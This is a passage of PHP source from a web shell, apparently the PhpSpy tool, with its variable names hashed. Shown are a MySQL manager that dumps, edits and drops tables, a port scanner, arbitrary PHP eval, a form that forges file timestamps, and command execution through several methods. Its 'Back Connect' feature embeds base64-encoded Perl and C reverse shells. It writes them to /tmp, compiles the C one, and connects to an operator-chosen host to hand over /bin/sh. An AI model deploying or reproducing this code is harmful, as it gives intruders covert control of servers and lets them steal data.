$spe0ea16 = @fopen($sp149c6d, 'w'); if ($spe0ea16) { foreach ($sp110772 as $sp8db113 => $sp6d4391) { if ($sp6d4391) { sqldumptable($sp6d4391, $spe0ea16); } } fclose($spe0ea16); $sp006042 = str_replace(SA_ROOT, '', $sp149c6d); m('Database has success backup to <a href="' . $sp006042 . '" target="_blank">' . $sp149c6d . '</a>'); mysql_close(); } else { m('Backup failed'); } } } if ($sp91fbfa && $spa62384) { $spc628db = $sp4d95bc = $sp5a7cd5 = ''; foreach ($spa62384 as $sp7ac89e => $spa59682) { if ($spa59682) { $spc628db .= $sp5a7cd5 . $sp7ac89e; $sp4d95bc .= $sp5a7cd5 . '\'' . addslashes($spa59682) . '\''; $sp5a7cd5 = ','; } } if ($spc628db && $sp4d95bc) { $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); m(q("INSERT INTO {$sp397cb0} ({$spc628db}) VALUES ({$sp4d95bc})") ? 'Insert new record of success' : mysql_error()); } } if ($sp5c88af && $spa62384 && $sp18d933) { $sp4d95bc = $sp5a7cd5 = ''; foreach ($spa62384 as $sp7ac89e => $spa59682) { $sp4d95bc .= $sp5a7cd5 . $sp7ac89e . '=\'' . addslashes($spa59682) . '\''; $sp5a7cd5 = ','; } if ($sp4d95bc) { $sp759d4e = base64_decode($sp18d933); $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); m(q("UPDATE {$sp397cb0} SET {$sp4d95bc} WHERE {$sp759d4e} LIMIT 1") ? 'Record updating' : mysql_error()); } } if ($sp803287 == 'del' && $sp18d933) { $sp759d4e = base64_decode($sp18d933); $sp02f955 = "DELETE FROM {$sp397cb0} WHERE {$sp759d4e}"; $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); m(q("DELETE FROM {$sp397cb0} WHERE {$sp759d4e}") ? 'Deletion record of success' : mysql_error()); } if ($sp397cb0 && $sp803287 == 'drop') { $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); if (q("DROP TABLE {$sp397cb0}")) { m('Drop table of success'); $sp397cb0 = ''; } else { m(mysql_error()); } } formhead(array('title' => 'MYSQL Manager')); makehide('action', 'mysqladmin'); p('<p>'); p('DBHost:'); makeinput(array('name' => 'dbhost', 'size' => 20, 'value' => $sp342aef)); p(':'); makeinput(array('name' => 'dbport', 'size' => 4, 'value' => $spb97ae1)); p('DBUser:'); makeinput(array('name' => 'dbuser', 'size' => 15, 'value' => $spe1f996)); p('DBPass:'); makeinput(array('name' => 'dbpass', 'size' => 15, 'value' => $spc9e959)); p('DBCharset:'); makeselect(array('name' => 'charset', 'option' => $spb669c1, 'selected' => $sp093c94, 'nokey' => 1)); makeinput(array('name' => 'connect', 'value' => 'Connect', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); formhead(array('name' => 'recordlist')); makehide('doing'); makehide('action', 'mysqladmin'); makehide('base64'); makehide('tablename'); p($sp8ad84e); formfoot(); formhead(array('name' => 'setdbname')); makehide('action', 'mysqladmin'); p($sp8ad84e); if (!$sp50c961) { makehide('dbname'); } formfoot(); formhead(array('name' => 'settable')); makehide('action', 'mysqladmin'); p($sp8ad84e); makehide('tablename'); makehide('page', $spb45fd2); makehide('doing'); formfoot(); $sp56786c = array(); $sp30aebb = 30; $spb45fd2 = intval($spb45fd2); if ($spb45fd2) { $sp115d33 = ($spb45fd2 - 1) * $sp30aebb; } else { $sp115d33 = 0; $spb45fd2 = 1; } if (isset($sp342aef) && isset($spe1f996) && isset($spc9e959) && isset($spfd4016)) { $sp3c234c = mydbconn($sp342aef, $spe1f996, $spc9e959, $sp50c961, $sp093c94, $spb97ae1); $spcf50c2 = mysql_get_server_info(); p('<p>MySQL ' . $spcf50c2 . ' running in ' . $sp342aef . ' as ' . $spe1f996 . '@' . $sp342aef . '</p>'); $sp7550a2 = $spcf50c2 > '4.1' ? 1 : 0; $sp8cac4d = q('SHOW DATABASES'); $spef7743 = array(); $spef7743[] = '-- Select a database --'; while ($sp95ae53 = mysql_fetch_array($sp8cac4d)) { $spef7743[$sp95ae53['Database']] = $sp95ae53['Database']; } makeselect(array('title' => 'Please select a database:', 'name' => 'db[]', 'option' => $spef7743, 'selected' => $sp50c961, 'onchange' => 'moddbname(this.options[this.selectedIndex].value)', 'newline' => 1)); $sp8b3c02 = array(); if ($sp50c961) { p('<p>'); p('Current dababase: <a href="javascript:moddbname(\'' . $sp50c961 . '\');">' . $sp50c961 . '</a>'); if ($sp397cb0) { p(' | Current Table: <a href="javascript:settable(\'' . $sp397cb0 . '\');">' . $sp397cb0 . '</a> [ <a href="javascript:settable(\'' . $sp397cb0 . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $sp397cb0 . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $sp397cb0 . '\', \'drop\');">Drop</a> ]'); } p('</p>'); mysql_select_db($sp50c961); $sp6df1b7 = ''; $spa53116 = 0; if ($spe252e2) { $spa53116 = 1; } $sp60f3ea = 0; if ($sp397cb0 && !$spe252e2) { $spe252e2 = "SELECT * FROM {$sp397cb0}"; $sp6df1b7 = $spe252e2; $spe252e2 = $spe252e2 . " LIMIT {$sp115d33}, {$sp30aebb}"; $sp60f3ea = 1; } p('<form action="' . $spb6c8e7 . '" method="POST">'); p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database ' . $sp50c961 . ':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">' . htmlspecialchars($spe252e2, ENT_QUOTES) . '</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>'); makehide('tablename', $sp397cb0); makehide('action', 'mysqladmin'); p($sp8ad84e); p('</form>'); if ($sp397cb0 || $spa53116 && $spe252e2) { if ($sp803287 == 'structure') { $spb7d120 = q("SHOW FULL COLUMNS FROM {$sp397cb0}"); $sp9c813b = array(); while ($spa596f1 = mysql_fetch_array($spb7d120)) { $sp9c813b[] = $spa596f1; } p('<h3>Structure</h3>'); p('<table border="0" cellpadding="3" cellspacing="0">'); p('<tr class="head">'); p('<td>Field</td>'); p('<td>Type</td>'); p('<td>Collation</td>'); p('<td>Null</td>'); p('<td>Key</td>'); p('<td>Default</td>'); p('<td>Extra</td>'); p('<td>Privileges</td>'); p('<td>Comment</td>'); p('</tr>'); foreach ($sp9c813b as $spa596f1) { $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td>' . $spa596f1['Field'] . '</td>'); p('<td>' . $spa596f1['Type'] . '</td>'); p('<td>' . $spa596f1['Collation'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Null'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Key'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Default'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Extra'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Privileges'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Comment'] . '&nbsp;</td>'); p('</tr>'); } tbfoot(); $spb7d120 = q("SHOW INDEX FROM {$sp397cb0}"); $sp9c813b = array(); while ($spa596f1 = mysql_fetch_array($spb7d120)) { $sp9c813b[] = $spa596f1; } p('<h3>Indexes</h3>'); p('<table border="0" cellpadding="3" cellspacing="0">'); p('<tr class="head">'); p('<td>Keyname</td>'); p('<td>Type</td>'); p('<td>Unique</td>'); p('<td>Packed</td>'); p('<td>Seq_in_index</td>'); p('<td>Field</td>'); p('<td>Cardinality</td>'); p('<td>Collation</td>'); p('<td>Null</td>'); p('<td>Comment</td>'); p('</tr>'); foreach ($sp9c813b as $spa596f1) { $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td>' . $spa596f1['Key_name'] . '</td>'); p('<td>' . $spa596f1['Index_type'] . '</td>'); p('<td>' . ($spa596f1['Non_unique'] ? 'No' : 'Yes') . '&nbsp;</td>'); p('<td>' . ($spa596f1['Packed'] === null ? 'No' : $spa596f1['Packed']) . '&nbsp;</td>'); p('<td>' . $spa596f1['Seq_in_index'] . '</td>'); p('<td>' . $spa596f1['Column_name'] . ($spa596f1['Sub_part'] ? '(' . $spa596f1['Sub_part'] . ')' : '') . '&nbsp;</td>'); p('<td>' . ($spa596f1['Cardinality'] ? $spa596f1['Cardinality'] : 0) . '&nbsp;</td>'); p('<td>' . $spa596f1['Collation'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Null'] . '&nbsp;</td>'); p('<td>' . $spa596f1['Comment'] . '&nbsp;</td>'); p('</tr>'); } tbfoot(); } elseif ($sp803287 == 'insert' || $sp803287 == 'edit') { $spb7d120 = q('SHOW COLUMNS FROM ' . $sp397cb0); while ($spa596f1 = mysql_fetch_array($spb7d120)) { $sp9c813b[] = $spa596f1; } $sp08dd24 = array(); if ($sp803287 == 'insert') { p('<h2>Insert new line in ' . $sp397cb0 . ' table &raquo;</h2>'); } else { p('<h2>Update record in ' . $sp397cb0 . ' table &raquo;</h2>'); $sp759d4e = base64_decode($sp18d933); $spb7d120 = q("SELECT * FROM {$sp397cb0} WHERE {$sp759d4e} LIMIT 1"); $sp08dd24 = mysql_fetch_array($spb7d120); } p('<form method="post" action="' . $spb6c8e7 . '">'); p($sp8ad84e); makehide('action', 'mysqladmin'); makehide('tablename', $sp397cb0); p('<table border="0" cellpadding="3" cellspacing="0">'); foreach ($sp9c813b as $spa596f1) { if ($sp08dd24[$spa596f1['Field']]) { $sp8e17b7 = htmlspecialchars($sp08dd24[$spa596f1['Field']]); } else { $sp8e17b7 = ''; } $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); if ($spa596f1['Key'] == 'UNI' || $spa596f1['Extra'] == 'auto_increment' || $spa596f1['Key'] == 'PRI') { p('<td><b>' . $spa596f1['Field'] . '</b><br />' . $spa596f1['Type'] . '</td><td>' . $sp8e17b7 . '&nbsp;</td></tr>'); } else { p('<td><b>' . $spa596f1['Field'] . '</b><br />' . $spa596f1['Type'] . '</td><td><textarea class="area" name="insertsql[' . $spa596f1['Field'] . ']" style="width:500px;height:60px;overflow:auto;">' . $sp8e17b7 . '</textarea></td></tr>'); } } if ($sp803287 == 'insert') { p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>'); } else { p('<tr class="' . bg() . '"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>'); makehide('base64', $sp18d933); } p('</table></form>'); } else { $spebd6e4 = @explode(';', $spe252e2); foreach ($spebd6e4 as $sp6cf735 => $sp8cac4d) { if ($sp8cac4d) { p("<p><b>Query#{$sp6cf735} : " . htmlspecialchars($sp8cac4d, ENT_QUOTES) . '</b></p>'); switch (qy($sp8cac4d)) { case 0: p('<h2>Error : ' . mysql_error() . '</h2>'); break; case 1: if (strtolower(substr($sp8cac4d, 0, 13)) == 'select * from') { $sp60f3ea = 1; } if ($sp6df1b7) { $sp4e6a5f = mysql_num_rows(q($sp6df1b7)); $sp0ef07d = multi($sp4e6a5f, $sp30aebb, $spb45fd2, $sp397cb0); } if (!$sp397cb0) { $sp449ecb = str_replace(array('', '
', '	'), array(' ', ' ', ' '), trim(htmlspecialchars($sp8cac4d))); $sp449ecb = preg_replace('/\\/\\*[^(\\*\\/)]*\\*\\//i', ' ', $sp449ecb); preg_match_all('/from\\s+`{0,1}([\\w]+)`{0,1}\\s+/i', $sp449ecb, $spbcfba9); $sp397cb0 = $spbcfba9[1][0]; } $sp2b92cf = q("SHOW COLUMNS FROM {$sp397cb0}"); $sp9c813b = array(); $spe47829 = ''; while ($spa596f1 = @mysql_fetch_assoc($sp2b92cf)) { $sp9c813b[$spa596f1['Field']]['Key'] = $spa596f1['Key']; $sp9c813b[$spa596f1['Field']]['Extra'] = $spa596f1['Extra']; if ($spa596f1['Key'] == 'UNI' || $spa596f1['Key'] == 'PRI') { $spe47829 = $spa596f1['Field']; } } if ($spe47829 && strtolower(substr($sp8cac4d, 0, 13)) == 'select * from') { $sp8cac4d = str_replace(' LIMIT ', " order by {$spe47829} DESC LIMIT ", $sp8cac4d); } $spb7d120 = q($sp8cac4d); p($sp0ef07d); p('<table border="0" cellpadding="3" cellspacing="0">'); p('<tr class="head">'); if ($sp60f3ea) { p('<td>Action</td>'); } $sp18eeff = @mysql_num_fields($spb7d120); for ($sp412bbc = 0; $sp412bbc < $sp18eeff; $sp412bbc++) { $spd86858 = @mysql_field_name($spb7d120, $sp412bbc); $spa48979 = @mysql_field_type($spb7d120, $sp412bbc); $sp100126 = @mysql_field_len($spb7d120, $sp412bbc); p("<td nowrap>{$spd86858}<br><span>{$spa48979}({$sp100126})" . ($sp9c813b[$spd86858]['Key'] == 'UNI' || $sp9c813b[$spd86858]['Key'] == 'PRI' ? '<b> - PRIMARY</b>' : '') . ($sp9c813b[$spd86858]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '') . '</span></td>'); } p('</tr>'); while ($spca873d = @mysql_fetch_assoc($spb7d120)) { $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); $sp759d4e = $sp5a7cd5 = $spe7e5f0 = ''; foreach ($spca873d as $sp7ac89e => $spdec8d4) { if ($spdec8d4) { if ($sp9c813b[$sp7ac89e]['Key'] == 'UNI' || $sp9c813b[$sp7ac89e]['Extra'] == 'auto_increment' || $sp9c813b[$sp7ac89e]['Key'] == 'PRI') { $sp759d4e = $sp7ac89e . '=\'' . addslashes($spdec8d4) . '\''; break; } $sp759d4e .= $sp5a7cd5 . $sp7ac89e . '=\'' . addslashes($spdec8d4) . '\''; $sp5a7cd5 = ' AND '; } } foreach ($spca873d as $sp7ac89e => $spdec8d4) { $spe7e5f0 .= '<td nowrap>' . html_clean($spdec8d4) . '&nbsp;</td>'; } $sp759d4e = base64_encode($sp759d4e); if ($sp60f3ea) { p('<td nowrap><a href="javascript:editrecord(\'edit\', \'' . $sp759d4e . '\', \'' . $sp397cb0 . '\');">Edit</a> | <a href="javascript:editrecord(\'del\', \'' . $sp759d4e . '\', \'' . $sp397cb0 . '\');">Del</a></td>'); } p($spe7e5f0); p('</tr>'); unset($spe7e5f0); } p('<tr class="head">'); if ($sp60f3ea) { p('<td>Action</td>'); } $sp18eeff = @mysql_num_fields($spb7d120); for ($sp412bbc = 0; $sp412bbc < $sp18eeff; $sp412bbc++) { $spd86858 = @mysql_field_name($spb7d120, $sp412bbc); $spa48979 = @mysql_field_type($spb7d120, $sp412bbc); $sp100126 = @mysql_field_len($spb7d120, $sp412bbc); p("<td nowrap>{$spd86858}<br><span>{$spa48979}({$sp100126})" . ($sp9c813b[$spd86858]['Key'] == 'UNI' || $sp9c813b[$spd86858]['Key'] == 'PRI' ? '<b> - PRIMARY</b>' : '') . ($sp9c813b[$spd86858]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '') . '</span></td>'); } p('</tr>'); tbfoot(); p($sp0ef07d); break; case 2: $sp33a125 = mysql_affected_rows(); p('<h2>affected rows : <b>' . $sp33a125 . '</b></h2>'); break; } } } } } else { echo '[syslog]06
'; $sp8cac4d = q('SHOW TABLE STATUS'); $spfcd1ca = $sp7460c5 = $sp6c8724 = 0; $sp8b3c02 = array(); while ($sp110772 = mysql_fetch_array($sp8cac4d)) { $sp6c8724 = $sp6c8724 + $sp110772['Data_length']; $sp7460c5 = $sp7460c5 + $sp110772['Rows']; $sp110772['Data_length'] = sizecount($sp110772['Data_length']); $spfcd1ca++; $sp8b3c02[] = $sp110772; } $sp6c8724 = sizecount($sp6c8724); unset($sp110772); p('<table border="0" cellpadding="0" cellspacing="0">'); p('<form action="' . $spb6c8e7 . '" method="POST">'); makehide('action', 'mysqladmin'); p($sp8ad84e); p('<tr class="head">'); p('<td width="2%" align="center">&nbsp;</td>'); p('<td>Name</td>'); p('<td>Rows</td>'); p('<td>Data_length</td>'); p('<td>Create_time</td>'); p('<td>Update_time</td>'); if ($sp7550a2) { p('<td>Engine</td>'); p('<td>Collation</td>'); } p('<td>Operate</td>'); p('</tr>'); foreach ($sp8b3c02 as $sp7ac89e => $sp110772) { $sp78d359 = bg(); p('<tr class="' . $sp78d359 . '" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'' . $sp78d359 . '\';">'); p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="' . $sp110772['Name'] . '" /></td>'); p('<td><a href="javascript:settable(\'' . $sp110772['Name'] . '\');">' . $sp110772['Name'] . '</a></td>'); p('<td>' . $sp110772['Rows'] . '</td>'); p('<td>' . $sp110772['Data_length'] . '</td>'); p('<td>' . $sp110772['Create_time'] . '&nbsp;</td>'); p('<td>' . $sp110772['Update_time'] . '&nbsp;</td>'); if ($sp7550a2) { p('<td>' . $sp110772['Engine'] . '</td>'); p('<td>' . $sp110772['Collation'] . '</td>'); } p('<td><a href="javascript:settable(\'' . $sp110772['Name'] . '\', \'insert\');">Insert</a> | <a href="javascript:settable(\'' . $sp110772['Name'] . '\', \'structure\');">Structure</a> | <a href="javascript:settable(\'' . $sp110772['Name'] . '\', \'drop\');">Drop</a></td>'); p('</tr>'); } p('<tr class="head">'); p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>'); p('<td>Name</td>'); p('<td>Rows</td>'); p('<td>Data_length</td>'); p('<td>Create_time</td>'); p('<td>Update_time</td>'); if ($sp7550a2) { p('<td>Engine</td>'); p('<td>Collation</td>'); } p('<td>Operate</td>'); p('</tr>'); p('<tr class=' . bg() . '>'); p('<td>&nbsp;</td>'); p('<td>Total tables: ' . $spfcd1ca . '</td>'); p('<td>' . $sp7460c5 . '</td>'); p('<td>' . $sp6c8724 . '</td>'); p('<td colspan="' . ($sp7550a2 ? 5 : 3) . '">&nbsp;</td>'); p('</tr>'); p('<tr class="' . bg() . '"><td colspan="' . ($sp7550a2 ? 9 : 7) . '"><input name="saveasfile" value="1" type="checkbox" /> Save as file <input class="input" name="path" value="' . SA_ROOT . $sp50c961 . '.sql" type="text" size="60" /> <input class="bt" type="submit" value="Export selection table" /></td></tr>'); makehide('doing', 'backupmysql'); formfoot(); p('</table>'); fr($sp8cac4d); } } } tbfoot(); @mysql_close(); } elseif ($spdeba40 == 'backconnect') { !$spf2e5eb && ($spf2e5eb = $_SERVER['REMOTE_ADDR']); !$sp26b880 && ($sp26b880 = '12345'); $spdb0b1f = array('perl' => 'perl', 'c' => 'c'); $sp0c418a = 'IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj' . 'aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR' . 'hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT' . 'sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI' . 'kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi' . 'KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl' . 'OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=='; $sp1bc54c = 'I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC' . 'BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb' . 'SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd' . 'KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ' . 'sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC' . 'Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D' . 'QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp' . 'Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=='; if ($spb2d035 && $spf2e5eb && $sp26b880 && $spc75644) { if ($spc75644 == 'perl') { cf('/tmp/angel_bc', $sp0c418a); $sp8e5eb2 = execute(which('perl') . " /tmp/angel_bc {$spf2e5eb} {$sp26b880} &"); } else { cf('/tmp/angel_bc.c', $sp1bc54c); $sp8e5eb2 = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c'); @unlink('/tmp/angel_bc.c'); $sp8e5eb2 = execute("/tmp/angel_bc {$spf2e5eb} {$sp26b880} &"); } m("Now script try connect to {$spf2e5eb} port {$sp26b880} ..."); } formhead(array('title' => 'Back Connect')); makehide('action', 'backconnect'); p('<p>'); p('Your IP:'); makeinput(array('name' => 'yourip', 'size' => 20, 'value' => $spf2e5eb)); p('Your Port:'); makeinput(array('name' => 'yourport', 'size' => 15, 'value' => $sp26b880)); p('Use:'); makeselect(array('name' => 'use', 'option' => $spdb0b1f, 'selected' => $spc75644)); makeinput(array('name' => 'start', 'value' => 'Start', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); } elseif ($spdeba40 == 'portscan') { !$sp783609 && ($sp783609 = '127.0.0.1'); !$spe330f7 && ($spe330f7 = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958'); formhead(array('title' => 'Port Scan')); makehide('action', 'portscan'); p('<p>'); p('IP:'); makeinput(array('name' => 'scanip', 'size' => 20, 'value' => $sp783609)); p('Port:'); makeinput(array('name' => 'scanport', 'size' => 80, 'value' => $spe330f7)); makeinput(array('name' => 'startscan', 'value' => 'Scan', 'type' => 'submit', 'class' => 'bt')); p('</p>'); formfoot(); if ($spd4061a) { p('<h2>Result &raquo;</h2>'); p('<ul class="info">'); foreach (explode(',', $spe330f7) as $sp83248d) { $spe0ea16 = @fsockopen($sp783609, $sp83248d, $specf052, $sp271e5b, 1); if (!$spe0ea16) { p('<li>' . $sp783609 . ':' . $sp83248d . ' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>'); } else { p('<li>' . $sp783609 . ':' . $sp83248d . ' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>'); @fclose($spe0ea16); } } p('</ul>'); } } elseif ($spdeba40 == 'eval') { $spd69ec6 = trim($spd69ec6); if ($spd69ec6) { if (!preg_match('#<\\?#si', $spd69ec6)) { $spd69ec6 = "<?php\n\n{$spd69ec6}\n\n?>"; } eval('?' . ">{$spd69ec6}<?"); } formhead(array('title' => 'Eval PHP Code')); makehide('action', 'eval'); maketext(array('title' => 'PHP Code', 'name' => 'phpcode', 'value' => $spd69ec6)); p('<p><a href="http://w' . 'ww.4ng' . 'el.net/php' . 'spy/pl' . 'ugin/" target="_blank">Get plugins</a></p>'); formfooter(); } elseif ($spdeba40 == 'editfile') { if (file_exists($sp9e156d)) { $spe0ea16 = @fopen($sp9e156d, 'r'); $sp6b22f3 = @fread($spe0ea16, filesize($sp9e156d)); @fclose($spe0ea16); $sp6b22f3 = htmlspecialchars($sp6b22f3); } formhead(array('title' => 'Create / Edit File')); makehide('action', 'file'); makehide('dir', $sp0c30a0); makeinput(array('title' => 'Current File (import new file name and new file)', 'name' => 'editfilename', 'value' => $sp9e156d, 'newline' => 1)); maketext(array('title' => 'File Content', 'name' => 'filecontent', 'value' => $sp6b22f3)); formfooter(); goback(); } elseif ($spdeba40 == 'newtime') { $spb3c667 = @filemtime($sp9e156d); $sp91f521 = array('January' => 1, 'February' => 2, 'March' => 3, 'April' => 4, 'May' => 5, 'June' => 6, 'July' => 7, 'August' => 8, 'September' => 9, 'October' => 10, 'November' => 11, 'December' => 12); formhead(array('title' => 'Clone folder/file was last modified time')); makehide('action', 'file'); makehide('dir', $sp0c30a0); makeinput(array('title' => 'Alter folder/file', 'name' => 'curfile', 'value' => $sp9e156d, 'size' => 120, 'newline' => 1)); makeinput(array('title' => 'Reference folder/file (fullpath)', 'name' => 'tarfile', 'size' => 120, 'newline' => 1)); formfooter(); formhead(array('title' => 'Set last modified')); makehide('action', 'file'); makehide('dir', $sp0c30a0); makeinput(array('title' => 'Current folder/file (fullpath)', 'name' => 'curfile', 'value' => $sp9e156d, 'size' => 120, 'newline' => 1)); p('<p>year:'); makeinput(array('name' => 'year', 'value' => date('Y', $spb3c667), 'size' => 4)); p('month:'); makeinput(array('name' => 'month', 'value' => date('m', $spb3c667), 'size' => 2)); p('day:'); makeinput(array('name' => 'day', 'value' => date('d', $spb3c667), 'size' => 2)); p('hour:'); makeinput(array('name' => 'hour', 'value' => date('H', $spb3c667), 'size' => 2)); p('minute:'); makeinput(array('name' => 'minute', 'value' => date('i', $spb3c667), 'size' => 2)); p('second:'); makeinput(array('name' => 'second', 'value' => date('s', $spb3c667), 'size' => 2)); p('</p>'); formfooter(); goback(); } elseif ($spdeba40 == 'shell') { if (IS_WIN && IS_COM) { if ($sp7ef3c9 && $sp647b77) { $sp261032 = new COM('Shell.Application'); $spd09f64 = $sp261032->ShellExecute($sp7ef3c9, $sp647b77); m('Program run has ' . (!$spd09f64 ? 'success' : 'fail')); } !$sp7ef3c9 && ($sp7ef3c9 = 'c:\\windows\\system32\\cmd.exe'); !$sp647b77 && ($sp647b77 = '/c net start > ' . SA_ROOT . 'log.txt'); formhead(array('title' => 'Execute Program')); makehide('action', 'shell'); makeinput(array('title' => 'Program', 'name' => 'program', 'value' => $sp7ef3c9, 'newline' => 1)); p('<p>'); makeinput(array('title' => 'Parameter', 'name' => 'parameter', 'value' => $sp647b77)); makeinput(array('name' => 'submit', 'class' => 'bt', 'type' => 'submit', 'value' => 'Execute')); p('</p>'); formfoot(); } formhead(array('title' => 'Execute Command')); makehide('action', 'shell'); if (IS_WIN && IS_COM) { $sp8eb0c6 = array('phpfunc' => 'phpfunc', 'wscript' => 'wscript', 'proc_open' => 'proc_open'); makeselect(array('title' => 'Use:', 'name' => 'execfunc', 'option' => $sp8eb0c6, 'selected' => $sp9346ca, 'newline' => 1)); } p('<p>'); makeinput(array('title' => 'Command', 'name' => 'command', 'value' => htmlspecialchars($sp2603de))); makeinput(array('name' => 'submit', 'class' => 'bt', 'type' => 'submit', 'value' => 'Execute')); p('</p>'); formfoot(); if ($sp2603de) { p('<hr width="100%" noshade /><pre>'); if ($sp9346ca == 'wscript' && IS_WIN && IS_COM) { $sp02b57f = new COM('WScript.shell'); $spe143cb = $sp02b57f->exec('cmd.exe /c ' . $sp2603de); $sp7dcb4c = $spe143cb->StdOut(); $spd5c1de = $sp7dcb4c->ReadAll(); echo $spd5c1de; } elseif ($sp9346ca == 'proc_open' && IS_WIN && IS_COM) { $spe37098 = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')); $spe3df60 = proc_open($_SERVER['COMSPEC'], $spe37098, $spa7a0b8); if (is_resource($spe3df60)) { fwrite($spa7a0b8[0], $sp2603de . '
'); fwrite($spa7a0b8[0], 'exit
